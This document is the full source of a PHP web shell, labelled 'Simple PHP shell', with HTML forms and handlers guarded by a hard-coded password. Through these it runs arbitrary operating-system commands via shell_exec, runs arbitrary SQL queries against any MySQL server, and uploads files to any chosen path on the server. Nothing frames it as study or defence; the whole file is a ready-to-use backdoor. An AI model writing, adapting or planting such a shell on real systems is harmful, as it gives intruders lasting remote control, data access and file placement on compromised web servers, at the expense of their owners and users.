<?php
/*
Simple PHP shell:
 - OS Command Execution
 - Executing MySQL Queries
 - Upload files
## Access to the functionalities is protected by a pre-defined password.
## Set the password on line number 53.
*/
?>
<form action="" method="post">
	<fieldset>
		<legend>Execute SQL Queries:</legend>
		<label for="sec">Security</label>
		<input type="password" name="sec"/><br><br>
		<label for="sname">DB Server</label>
		<input name="sname"/>
		<label for="dbname">DB Name</label>
		<input name="dbname"/><br><br>
		<label for="dbuname">DB User</label>
		<input name="dbuname"/>
		<label for="dbpass">DB Pass</label>
		<input type="password" name="dbpass"/><br><br>
		<label for="squery">SQL Query</label>
		<input name="squery" style="width:80%;"/>
		<button type="submit">Execute</button>
	</fieldset>
</form>
<form action="" method="post">
	<fieldset>
		<legend>Execute OS Commands:</legend>
		<label for="sec">Security</label>
		<input type="password" name="sec"/><br><br>
		<label for="cmd">Command</label>
		<input name="cmd" style="width:80%;"/>
		<button type="submit">Execute</button>
	</fieldset>
</form>
<form enctype="multipart/form-data" action="" method="post">
	<fieldset>
		<legend>Upload File:</legend>
		<label for="sec">Security</label>
		<input type="password" name="sec"/><br><br>
		<label for="tpath">Upload Location</label>
		<input name="tpath" value="<?php echo getcwd().((PHP_OS=="WINNT") ? '\\' : '/'); ?>"/>
		<label for="myfile">Choose File</label>
		<input name="myfile" type="file"/>
		<button type="submit">Upload</button>
	</fieldset>
</form>
<?php
//Mention your secret password here
$secret_password = "secret_pass_here";
if(isset($_POST['sec']))
{
	if(urldecode($_POST['sec'])==$secret_password)
	{
		//For executing SQL queries
	    if(isset($_POST['sname']) && isset($_POST['squery']) && isset($_POST['dbuname']) && isset($_POST['dbpass']) && isset($_POST['dbname']))
		{
			$servername = $_POST['sname'];
	        $squery = $_POST['squery'];
			$dbuname = $_POST['dbuname'];
			$dbpass = $_POST['dbpass'];
			$dbname	= $_POST['dbname'];

			//print_r($_POST);
			echo "<b>SQL Query: <i>".htmlentities($squery)."</i></b><br><br>";
			$conn = new mysqli($servername, $dbuname, $dbpass, $dbname);
			// Check connection
			if ($conn->connect_error)
			{
			    die("Connection failed: " . $conn->connect_error);
			} 
			
			$result = $conn->query($squery);

			if ($result->num_rows > 0)
			{
				$start = 0;
			    // output data of each row
				echo '<table border="1">';
			    while($row = $result->fetch_assoc())
				{
					if($start==0)
					{
						$col_names = array_keys($row);
						echo "<tr>";
						foreach($col_names as $col)
						{
							echo "<th>$col</th>";
						}
						echo "</tr>";
						$start++;
					}
					//echo "<pre>";
					//print_r($row);
					//echo "</pre>";
					echo "<tr>";
					foreach($row as $val)
					{
						echo "<td>$val</td>";
					}
					echo "</tr>";
			    }
				echo '</table>';
			}
			else
			{
			    echo "0 results";
			}
			$conn->close();
		}
		elseif(isset($_POST['cmd']))//For command execution
		{
			echo "<b>Command: <i>".htmlentities($_POST['cmd'])."</i></b><br><br>";
			echo "<b>Output: </b><br>";
			echo "<pre>";
			highlight_string(shell_exec($_POST['cmd']));
			echo "</pre>";
		}
		elseif(isset($_FILES['myfile']) && isset($_POST['tpath']))
		{
			$target_path = $_POST['tpath'];
			$target_path = $target_path.basename($_FILES['myfile']['name']);
			echo "<b>File Upload: ";
			if(move_uploaded_file($_FILES['myfile']['tmp_name'], $target_path))
			{
				echo "<i>The file <u>".htmlentities(basename($_FILES['myfile']['name']))."</u> has been uploaded</i>";
			}
			else
			{
				echo "<i>There was an error uploading the file, please try again!</i>";
			}
			echo "</b>";
		}
		else
		{
			
		}
	}
}
?>
